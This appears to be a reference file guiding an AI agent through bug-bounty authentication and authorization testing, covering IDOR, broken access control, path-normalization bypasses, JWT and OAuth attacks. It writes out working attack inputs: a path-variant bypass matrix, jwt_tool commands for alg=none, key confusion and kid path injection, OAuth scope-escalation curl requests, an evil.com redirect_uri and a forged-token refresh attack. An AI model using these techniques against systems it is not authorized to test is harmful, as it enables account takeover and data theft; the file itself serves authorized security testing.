---
name: bb-authz
description: "bb-authz — AuthN/AuthZ Testing Reference. Companion to `bb-ops/playbooks/{idor,broken-access-control,jwt,oauth,auth-bypass}.yaml`. Load in authz-analyzer tasks. Two-account testing is mandatory for IDOR claims."
---

# bb-authz — AuthN/AuthZ Testing Reference

Companion to `bb-ops/playbooks/{idor,broken-access-control,jwt,oauth,auth-bypass}.yaml`.
Load in authz-analyzer tasks. Two-account testing is mandatory for IDOR claims.

## IDOR / BOLA checklist
```
# read another's resource (swap ids across accounts)
GET /v1/users/{id}   GET /v1/orders/{id}   GET /v1/profiles/{uuid}
# write/delete another's resource
PUT/DELETE /v1/items/{id}
# list-scope leak
GET /v1/items?userId=OTHER
```
- Scope headers (e.g. `AC-Property-ID`, `X-Tenant-ID`) are prime BOLA targets — swap the
  header value across accounts/tenants and compare.

## Broken access control
```
# role escalation
POST /admin/user/export   as normal user
POST /v1/init             as normal user   (permission-initialization = IDOR)
# gateway-vs-service check: hit the service origin directly, bypassing gateway ACL
# missing auth: drop Authorization entirely, compare status codes
```

## Path normalization authz bypass (playbook: path-normalization)
Systematic variant matrix against every role-gated endpoint. Record exact-path
baseline (status + body) FIRST, then replay each variant and diff:
```
# trailing slash / double slash
/path  /path/  /path//
# semicolon matrix params / encoded
/path;  /path;foo=bar  /path%3b
# encoded slash / dot segments
/path%2f  %2fpath  /path%2e  /path%2e%2e/  /./  /../
# case flips
/PaTh  /PATH  /pAtH
# backslash / unicode space / double-encode
/path\  /path%5c  /path%E2%80%AF  /path%252f
# matrix dup / repeated segment
/path;path  /path/path
```
- Signal = status/body DIFFERS from baseline (401/403/"No Access" -> 200 or a different
  500/execution error) AND a protected handler is reached.
- 404 on the variant = matcher and router agreed = NOT a bypass. 30x = follow and re-test.
- Prime suspect: authz filter does exact matching, dispatcher normalizes (Spring Security
  PathPatternParser vs Jersey/DispatcherServlet). Reference: JFrog Artifactory
  `/access/api/v1/aws/token/` pre-auth JWT grant (CVE-2026-65616 chain step 1).
- Always re-test a winning variant against the service origin directly (gateway-only
  authz is bypassable).
- Complement with method confusion: POST->GET, OPTIONS->PUT, HEAD, TRACE on the same path
  (some routers dispatch methods the matcher ignores).

## JWT (order matters)
```
jwt_tool <token> -T                                # decode + tamper playground
jwt_tool <token> -X a                              # alg=none
jwt_tool <token> -X k -pk <public.pem>             # RS256->HS256 with public key
jwt_tool <token> -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""   # kid injection
# discovery
curl -s https://HOST/.well-known/jwks.json ; curl -s https://HOST/v1/.well-known/jwks.json
```
- Never crack real-user tokens. Use test accounts.

## OAuth
```
# scope escalation in client_credentials
curl -s -X POST https://HOST/v1/oauth2/token -d "client_id=X&client_secret=Y&grant_type=client_credentials&scope=admin"
# redirect_uri validation
...&redirect_uri=https://evil.com/cb
# refresh rotation: reuse a spent refresh token, check for revocation
# leaked client secret in SPA bundle -> token theft if grant allows
# claim confusion (CVE-2026-65616): valid refresh secret + forged sibling access_token
curl -s -X POST https://HOST/v1/oauth2/token \
  -d "grant_type=refresh_token&refresh_token=$VALID_REFRESH" \
  -d "access_token=$FORGED_JWT"        # forged claims (scp/sub/aud), random-signature
# TP if response re-signs attacker claims -> arbitrary scope/token forgery
# jwt_tool tamper for the sibling:  -X a (alg=none), kid injection, claim swap
```

## Session / cookie
- `Secure`, `HttpOnly`, `SameSite` missing on auth cookies; session fixation; no rotation on login.

## Output
- Evidence: HTTP pair for the winning request. Flag `needs_second_account` when IDOR
  couldn't be cross-account tested. Never self-confirm.
